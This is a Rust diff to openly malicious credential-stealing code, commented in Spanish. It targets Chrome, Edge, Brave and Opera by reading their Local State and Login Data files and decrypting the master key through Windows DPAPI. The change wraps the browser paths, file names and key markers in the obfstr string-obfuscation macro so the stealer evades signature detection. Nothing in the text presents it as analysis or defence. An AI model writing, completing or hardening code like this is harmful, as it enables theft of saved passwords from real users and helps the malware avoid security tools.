@@ -7,6 +7,7 @@ use aes_gcm::{
     aead::{Aead, KeyInit},
     Aes256Gcm, Nonce,
 };
+use obfstr::obfstr; // ← Ofuscación de strings
 
 #[cfg(target_os = "windows")]
 use winapi::um::dpapi::CryptUnprotectData;
@@ -15,22 +16,22 @@ use winapi::um::wincrypt::DATA_BLOB;
 
 /// Roba credenciales de Google Chrome
 pub fn steal_chrome() -> StealerResult<Vec<Credential>> {
-    steal_chromium_browser("Chrome", r"Google\Chrome\User Data")
+    steal_chromium_browser(obfstr!("Chrome"), obfstr!(r"Google\Chrome\User Data"))
 }
 
 /// Roba credenciales de Microsoft Edge
 pub fn steal_edge() -> StealerResult<Vec<Credential>> {
-    steal_chromium_browser("Edge", r"Microsoft\Edge\User Data")
+    steal_chromium_browser(obfstr!("Edge"), obfstr!(r"Microsoft\Edge\User Data"))
 }
 
 /// Roba credenciales de Brave Browser
 pub fn steal_brave() -> StealerResult<Vec<Credential>> {
-    steal_chromium_browser("Brave", r"BraveSoftware\Brave-Browser\User Data")
+    steal_chromium_browser(obfstr!("Brave"), obfstr!(r"BraveSoftware\Brave-Browser\User Data"))
 }
 
 /// Roba credenciales de Opera
 pub fn steal_opera() -> StealerResult<Vec<Credential>> {
-    steal_chromium_browser("Opera", r"Opera Software\Opera Stable")
+    steal_chromium_browser(obfstr!("Opera"), obfstr!(r"Opera Software\Opera Stable"))
 }
 
 /// Función genérica para robar credenciales de cualquier browser Chromium
@@ -43,13 +44,13 @@ fn steal_chromium_browser(browser_name: &str, relative_path: &str) -> StealerRes
     }
 
     // Ruta a Local State (para obtener la clave de encriptación)
-    let local_state_path = browser_path.join("Local State");
+    let local_state_path = browser_path.join(obfstr!("Local State"));
     
     // Ruta a la base de datos de logins
-    let login_data_path = browser_path.join(r"Default\Login Data");
+    let login_data_path = browser_path.join(obfstr!(r"Default\Login Data"));
     
     if !file_exists(&login_data_path) {
-        return Err(StealerError::DatabaseError("Login Data no encontrado".into()));
+        return Err(StealerError::DatabaseError(obfstr!("Login Data no encontrado").into()));
     }
 
     // Leer y parsear Local State para obtener la master key
@@ -89,8 +90,8 @@ fn extract_master_key(local_state_path: &PathBuf) -> StealerResult<Option<Vec<u8
     let content = std::fs::read_to_string(local_state_path)
         .map_err(|e| StealerError::IoError(e.to_string()))?;
     
-    // Buscar la clave encriptada (búsqueda simple sin JSON parser)
-    if let Some(start) = content.find("\"encrypted_key\":\"") {
+    // Buscar la clave encriptada (búsqueda simple sin JSON parser) - OFUSCADO
+    if let Some(start) = content.find(obfstr!("\"encrypted_key\":\"")) {
         let start_idx = start + 17;
         if let Some(end) = content[start_idx..].find("\"") {
             let base64_key = &content[start_idx..start_idx + end];
@@ -100,7 +101,7 @@ fn extract_master_key(local_state_path: &PathBuf) -> StealerResult<Option<Vec<u8
                 .map_err(|_| StealerError::Base64Error)?;
             
             // Los primeros 5 bytes son "DPAPI", los removemos
-            if encrypted_key.len() > 5 && &encrypted_key[0..5] == b"DPAPI" {
+            if encrypted_key.len() > 5 && &encrypted_key[0..5] == obfstr!("DPAPI").as_bytes() {
                 let encrypted_without_prefix = &encrypted_key[5..];
                 
                 // Desencriptar usando DPAPI (solo Windows)
